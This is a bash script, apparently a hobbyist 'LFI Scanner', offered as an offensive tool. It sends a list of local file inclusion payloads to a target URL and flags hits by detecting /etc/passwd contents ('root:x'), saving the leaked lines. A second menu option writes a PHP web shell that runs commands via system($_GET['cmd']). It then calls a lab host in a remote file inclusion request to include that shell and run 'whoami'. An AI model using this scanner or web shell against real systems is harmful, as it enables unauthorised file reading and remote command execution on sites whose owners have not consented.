#!/bin/bash
clear
RED='\e[1;91m'
BLUE='\033[0;34m'
BRED='\033[1;31m' 
PURPLE='\033[0;35m'
WHITE='\033[0;37m'
BCYAN='\033[1;36m'
YELLOW='\033[0;33m'
BWHITE='\033[1;37m'
BGREEN='\033[1;32m'
RESET='\033[0m'
VER='0.1'
user=$(whoami)
date=$(date "+%D Time: %I:%M %p")

# Banner
banner(){
cat<<"EOF"
         _nnnn_                      
        dGGGGMMb     ,"""""""""""""""""""""""""""""""""""""".
       @p~qp~~qMb    |             LFI Scanner              |
       M|@||@) M|   _;......................................'
       @,----.JM| -'
      JS^\__/  qKL
     dZP        qKRb
    dZP          qKKb
   fZP            SMMb
   HZM            MMMM
   FqM            MMMM
 __| ".        |\dS"qML
 |    `.       | `' \Zq
_)      \.___.,|     .'
\____   )MMMMMM|   .'
     `-'       `--' dogukaN
EOF
echo ""
echo -e "${YELLOW}+ -- --=[Date: $date"
echo -e "${RED}+ -- --=[Welcome $user :)"
echo -e "${BLUE}+ -- --=[LFI Scanner v$VER by @dogukankurnaz"
echo -e "${PURPLE}+ -- --=[https://github.com/dogukankurnaz"
echo -e "${RESET}"
}
banner



# #URL CHECK
# if [[ $1 == '' || $2 == '' ]]
# then
# 	echo "FATAL ERROR!"
# 	echo "Example command: [+] $0 "
# 	exit 1
# fi

echo -e ${CP}"[+] Checking Internet Connectivity"
if [[ "$(ping -c 1 8.8.8.8 | grep '100% packet loss' )" != "" ]]; then
  echo -e -n "[...] No Internet Connection"
  exit 1
else
  echo -e -n "[...] Internet is present"  
fi

echo -e -n "\n------------------------------------------------\n"

echo -e -n "${WHITE}[1] LFISCANNER \n"
echo -e -n "${WHITE}[2] SHELL \n"

read -p "Choice = " -i Y input


if [[ $input == "1" ]]; 
then
    echo -e -n "${YELLOW}\n[+] Enter domain name (e.g. https://target.com/index.php?page=) : "
    read domain
    echo -e -n "${YELLOW}\n[+] Enter path of payloads list:  "
    read payload
    sleep 1
    echo -e "\n[+] Starting Scan LFI: "
    echo -e "${BWHITE}\n[~~] The script is currently running in silent mode. It will output to the screen only when Vulnerability is found. "
    sleep 1
    for i in $(cat $payload); 
    do
        file=$(curl -s -m5  $domain$i)
        echo -n -e "${BGREEN}\nURL: $domain" >> output.txt
        echo "$file" >> output.txt
        if grep root:x   <<<"$file" >/dev/null 2>&1
        then
            echo -n -e "${BRED}\nURL: $domain ${BCYAN}\n"[Payload $i]" ${BRED}[Vulnerable]\n"
            echo "Vulnerable Link: $domain$i" >> vulnerable_url.txt
            cat output.txt | grep -e root:x >> vulnerable_url.txt
            cat output.txt | sed '3,18p;d' >> vulnerable_url.txt
            rm output.txt
        else
            echo -n -e "${BWHITE}\nURL: $domain ${BCYAN} \n"[Payload $i]" ${BWHITE}[Not Vulnerable]\n"
            rm output.txt
        fi
    done

    echo -e -n "${PURPLE}[+] Vulnerable_url.txt created. \n "
fi
if [[ $input == "2" ]];
then
    echo "<?php" > shell.txt
    echo "    system($_GET["cmd"]);" >> shell.txt
    echo "?>" >> shell.txt
    while true; 
    do
    echo -ne "${RED}shell>${NC} "
    read -r cmd
    curl -X POST http://10.0.2.4/phpWebsite/index.php?page=http://10.0.2.4/shell.txt&cmd=whoami


    # if [[ ! -z "$cmd" ]]; then
    #    curl -X GET $ip/shell.txt'&'cmd=$cmd >> dil.txt
    # fi
    done
fi
